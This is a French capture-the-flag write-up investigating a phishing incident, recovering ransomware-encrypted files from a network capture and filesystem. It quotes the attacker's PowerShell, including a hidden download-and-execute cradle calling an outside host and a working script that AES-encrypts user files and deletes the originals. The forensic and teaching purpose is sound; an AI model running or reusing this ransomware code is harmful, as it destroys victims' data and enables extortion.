# Enquête sur le phishing des JO : Retracer l'attaque 2/2

### Énoncé

Bravo !

Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers.

L'utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d'information des JO.

Aidez-la à déchiffrer son système de fichiers.

SHA256(Phishing2-1.zip) = EDE0509D4779093EEBDA4B2483B943721F7B1F54801BFEFFF11E39B719D224BE : 202407885 octets
SHA256(Capture.pcapng) = 6D1F223BCC377E1722F8DAE0FB9F2EE397878B87ACA53814D4628562CBF1B933 : 167172844 octets

---

### Résolution

Après avoir investigué le dump mémoire de l’ordinateur de la victime pour comprendre l’origine du phishing, on nous confie un dump réseau et une partie de son système de fichier pour comprendre précisement ce qu’il s’est passé et tenter de le restaurer.
En ouvrant la capture réseau avec Wireshark, on constate qu’un script Powershell est téléchargé en premier et qu’il va initier toute une série d’opérations:

```powershell
...
...
# Le code ci-dessus concernait le challenge 1/2

#Encrypt some file

powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c "& {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}"

## Change wallpaper
$webClient = New-Object System.Net.WebClient
$wallpaperUrl = "http://$IP_addr/Holmes/wallpaper.jpg"
$wallpaperPath = "$env:USERPROFILE\Desktop\wallpaper.jpg"
$webClient.DownloadFile($wallpaperUrl, $wallpaperPath)

## Set the wallpaper
$regKey = "HKCU:\Control Panel\Desktop"
Set-ItemProperty -Path $regKey -Name Wallpaper -Value $wallpaperPath
$wallpaperStyle = "3"
Set-ItemProperty -Path $regKey -Name WallpaperStyle -Value $wallpaperStyle
$tileWallpaper = "0"
Set-ItemProperty -Path $regKey -Name TileWallpaper -Value $tileWallpaper

# Forcer l'actualisation du bureau
Start-Process -FilePath "RUNDLL32.EXE" -ArgumentList "USER32.DLL,UpdatePerUserSystemParameters ,1 ,True" -Wait

## Create text file
$fileContent = "YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE"
Set-Content "$env:USERPROFILE\Desktop\instructions.txt" -Value $fileContent
# Open text file
Invoke-Item "$env:USERPROFILE\Desktop\instructions.txt"
```

Ce script powershell fait plusieurs choses:

- Télécharge et execute un second script `Encrypt.ps1` (on y revient juste après)
- Télécharge et change le fond d’écran de la victime
- Créé un fichier texte à destination de cette dernière avec des instructions pour récupérer ses fichiers

Extrayons `Encrypt.ps1` du dump réseau (dans Wireshark > Fichier > Export Objet > HTTP) et creusons-le:

```powershell
# Define the directories to search for files
$IP_addr = '172.21.195.17:5000'
$directories = @("$env:USERPROFILE")

# Define the file extensions to encrypt
$extensions = @(".png", ".doc", ".txt", ".zip")
$keyUrl = "http://$IP_addr/Holmes/key.txt"

# Download the key from the URL
$keyContent64 = Invoke-WebRequest -Uri $keyUrl | Select-Object -ExpandProperty Content
$keyContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($keyContent64))

# Use SHA-256 hash function to produce a 32-byte key
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyContent))
$iv = [System.Security.Cryptography.RijndaelManaged]::Create().IV

# Sauvegarder l'IV dans un fichier
$ivFilePath = "$env:USERPROFILE\Documents\iv"
[System.IO.File]::WriteAllBytes($ivFilePath, $iv)

# Create a new RijndaelManaged object with the specified key
$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.Key = $key
$rijndael.IV = $iv
$rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7


# Go through each directory
foreach ($dir in $directories) {
    # Go through each file
    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
        # Check the file extension
        if ($extensions -contains $_.Extension) {
            # Generate the new file name
            $newName = $_.FullName -replace $_.Extension, ".shutlock"

            # Read the file contents in bytes
            $contentBytes = [System.IO.File]::ReadAllBytes($_.FullName)

            # Create a new encryptor
            $encryptor = $rijndael.CreateEncryptor()

            # Encrypt the content
            $encryptedBytes = $encryptor.TransformFinalBlock($contentBytes, 0, $contentBytes.Length)

            # Write the encrypted content to a file
            [System.IO.File]::WriteAllBytes($newName, $encryptedBytes)

            # Delete the original file
            Remove-Item $_.FullName
        }
    }
}
```

Le script fait plusieurs choses:

- Il télécharge un fichier `key.txt`, donc il base64decode le contenu, puis le hash à l’aide de SHA256
- Il génère un [iv](https://en.wikipedia.org/wiki/Initialization_vector) qui est enregistré sur l’ordinateur de la victime.
- Un objet cryptographique est instancié et initialisé avec cette clé, l’iv, un mode de chiffrement et un mode de padding.
- Ensuite, il itère sur tout le système de fichier et remplace chaque fichier `png`/`doc`/`txt`/`zip` par leur équivalent chiffré.

La classe instanciée est `RijndaelManaged` (AES). Étant un chiffrement symétrique (la même clé sert à chiffrer et déchiffrer), on devrait pouvoir restaurer le système de fichier, moyennant quelques vérifications:

On trouve effectivement un fichier `iv` dans le système de fichier fourni:

```bash
$ ls FileSystem/Documents 
desktop.ini  iv  Perso  Recherche  Tools
```

De la même manière que l’on a extrait du dump réseau les script powershell, on peut aussi extraire le fichier `key.txt`.
On a tous les éléments en main pour écrire un script python qui reproduit peu ou prou le script powershell, à l’exception que l’on va déchiffrer les fichiers !

```python
import os
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

encrypted_files = []

def find_encrypted_files(dir_):
    for elem in os.listdir(dir_):
        abs_path = dir_ + elem
        if os.path.isfile(abs_path) and ".shutlock" in elem:
            print("Found encrypted file: ", abs_path)
            encrypted_files.append(abs_path)
        elif not os.path.isfile(abs_path):
            find_encrypted_files(dir_ + elem + "/")

def decrypt_files():
    with open("FileSystem/Documents/iv", "rb") as f:
        iv = f.read()

    with open("key.txt", "rb") as f:
        content = base64.b64decode(f.read())
        key = hashlib.sha256(content).digest()

    cipher = AES.new(key, AES.MODE_CBC, iv)

    for encrypted_file in encrypted_files:
        with open(encrypted_file, "rb") as f:
            cipher_text = f.read()

        plain_text = unpad(cipher.decrypt(cipher_text), AES.block_size)
        with open(f"{encrypted_file}.decrypted", "wb") as f:
            f.write(plain_text)
        print(f"Successfully decrypted {encrypted_file}")

if __name__ == "__main__":
    find_encrypted_files("FileSystem/")
    decrypt_files()
```

```bash
$ python exploit.py
Found encrypted file:  FileSystem/Downloads/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.shutlock
Found encrypted file:  FileSystem/Documents/Perso/Image/duck.shutlock
Found encrypted file:  FileSystem/Documents/Perso/File-kP8Mx.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/importante_recherche.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-1qMpT.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-OJBHa.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-KGfkL.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-BUpOl.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-F4UmI.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-rohk4.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-ZaxO4.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-mUcVz.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-nl057.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-QBbDS.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-QJYLN.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-y7p4n.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-NucI4.shutlock
Found encrypted file:  FileSystem/Documents/Recherche/File/File-tWsGf.shutlock
Successfully decrypted FileSystem/Downloads/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.shutlock
Successfully decrypted FileSystem/Documents/Perso/Image/duck.shutlock
Successfully decrypted FileSystem/Documents/Perso/File-kP8Mx.shutlock
Successfully decrypted FileSystem/Documents/Recherche/importante_recherche.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-1qMpT.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-OJBHa.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-KGfkL.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-BUpOl.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-F4UmI.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-rohk4.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-ZaxO4.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-mUcVz.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-nl057.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-QBbDS.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-QJYLN.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-y7p4n.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-NucI4.shutlock
Successfully decrypted FileSystem/Documents/Recherche/File/File-tWsGf.shutlock
```

On a restauré avec succès le système de la victime, on peut se mettre à la recherche du flag:

```bash
$ for file in $(find -name "*.decrypted"); do file $file; done;
./FileSystem/Downloads/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.shutlock.decrypted: Zip archive data, at least v2.0 to extract, compression method=deflate
./FileSystem/Documents/Perso/Image/duck.shutlock.decrypted: PNG image data, 2144 x 3183, 8-bit/color RGBA, non-interlaced
./FileSystem/Documents/Perso/File-kP8Mx.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/importante_recherche.shutlock.decrypted: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
./FileSystem/Documents/Recherche/File/File-1qMpT.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-NucI4.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-mUcVz.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-QJYLN.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-ZaxO4.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-F4UmI.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-rohk4.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-QBbDS.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-nl057.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-tWsGf.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-BUpOl.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-KGfkL.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-y7p4n.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
./FileSystem/Documents/Recherche/File/File-OJBHa.shutlock.decrypted: Non-ISO extended-ASCII text, with very long lines (1023)
```

L’archive `importante_recherche` semble être un bon candidat, mais elle est chiffrée également ! (`compression method=AES Encrypted`)
L’énoncé nous apprends que c’est une scientifique qui travaille sur les méthodes de chiffrement, c’est donc l’utilisatrice qui a probablement protégé ses recherches. Étant donné que l’on dispose de son système de fichier, on peut se mettre à la recherche du mot de passe de l’archive.

Si on tente une recherche avec le nom du dossier avant compression (`importante recherche`), on a un résultat qui semble intéressant:

```bash
$ grep "importante recherche" -r FileSystem 
grep: FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal : fichiers binaires correspondent
```

Un fichier SQLite qui contient toutes les données des post-it Windows de la victime !

```bash
$ strings FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal | grep "importante recherche"
\id=1f0391ce-61cd-4649-af89-3814161c7556 pwd importante recherche: s3cr3t_r3ch3rch3_pwd_!ManagedPosition=Yellowd258c4ba-5e6a-46f7-a389-b5b44588db04b313c38c-0b02-4c64-b989-5e7734d8454e
```

Le mot de passe en poche, `s3cr3t_r3ch3rch3_pwd_!`, on peut décompresser l’archive. On y trouve deux fichiers, une image `chiffrement.jpeg` et un pdf `recherches_algorithmes_de_chiffrement.pdf`. Rien d’intéressant dans le pdf ni dans l’image.

Est-ce que l’auteur aurait pu cacher le flag dans l’image ? Essayons:

```bash
$ steghide extract -sf chiffrement.jpeg && cat flag.txt
Entrez la passphrase: 
�criture des donn�es extraites dans "flag.txt".
SHLK{4uri3z-v0us_cl1qu3r}
```
(Il n’y avait pas de passphrase)

Flag !
